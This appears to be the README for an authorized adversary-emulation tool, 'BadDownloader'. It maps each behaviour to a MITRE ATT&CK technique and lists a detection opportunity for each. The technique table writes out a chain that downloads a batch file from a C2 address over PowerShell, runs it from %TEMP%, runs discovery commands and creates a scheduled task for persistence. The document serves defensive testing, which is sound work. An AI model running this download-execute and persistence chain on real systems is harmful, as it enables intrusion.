# BadDownloader — MITRE ATT&CK Mapping

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

Final payload: calc.exe (safe, benign)
C2: Local network only (hardcoded private IP: 192.168.0.148)
============================================================================
```

## Complete Technique Mapping

| Technique ID | Name | Tactic | Stage | Implementation Detail | Detection Opportunity |
|-------------|------|--------|-------|----------------------|----------------------|
| T1204.002 | User Execution: Malicious File | Execution | Delivery | Operator executes BadDownloader.exe on Windows VM | Process creation: unknown binary executing from unusual path |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution | Stage 1 | `powershell.exe Invoke-WebRequest` downloads .bat payload from C2 | Process: `cmd.exe` → `powershell.exe`; Command line: `Invoke-WebRequest` with IP address |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Execution | Stage 2 | `cmd.exe /c %TEMP%\baddownload.bat` executes downloaded payload | Process: `BadDownloader.exe` → `cmd.exe`; Command line: .bat file from `%TEMP%` |
| T1105 | Ingress Tool Transfer | Command and Control | Stage 1 | HTTP GET to `http://192.168.0.148:8888/baddownload.bat` via PowerShell | Network: HTTP to non-standard port; File write: .bat in `%TEMP%` |
| T1033 | System Owner/User Discovery | Discovery | Stage 2 | `whoami` — identifies current user context | Process: `cmd.exe` child; Command line: `whoami` |
| T1016 | System Network Configuration Discovery | Discovery | Stage 2 | `ipconfig /all` — enumerates network adapters, DNS, DHCP | Process: `cmd.exe` child; Command line: `ipconfig /all` |
| T1082 | System Information Discovery | Discovery | Stage 2 | `systeminfo` — collects OS version, architecture, domain, hotfixes | Process: `cmd.exe` child; Command line: `systeminfo` |
| T1087.001 | Account Discovery: Local Account | Discovery | Stage 2 | `net user` — enumerates local user accounts | Process: `cmd.exe` child; Command line: `net user` |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Persistence | Stage 2 | `schtasks /create /tn "BadDownloader" /tr "calc.exe" /sc daily /st 08:00 /f` | Process: `schtasks.exe` with `/create`; Windows Event 4698 |

## MITRE ATT&CK Navigator Layer

```
Execution  →  Persistence  →  Discovery  →  C2
T1204.002     T1053.005       T1033        T1105
T1059.001                     T1016
T1059.003                     T1082
                              T1087.001
```

## Technique References

| Technique ID | MITRE ATT&CK URL |
|-------------|-------------------|
| T1204.002 | https://attack.mitre.org/techniques/T1204/002/ |
| T1059.001 | https://attack.mitre.org/techniques/T1059/001/ |
| T1059.003 | https://attack.mitre.org/techniques/T1059/003/ |
| T1105 | https://attack.mitre.org/techniques/T1105/ |
| T1033 | https://attack.mitre.org/techniques/T1033/ |
| T1016 | https://attack.mitre.org/techniques/T1016/ |
| T1082 | https://attack.mitre.org/techniques/T1082/ |
| T1087.001 | https://attack.mitre.org/techniques/T1087/001/ |
| T1053.005 | https://attack.mitre.org/techniques/T1053/005/ |
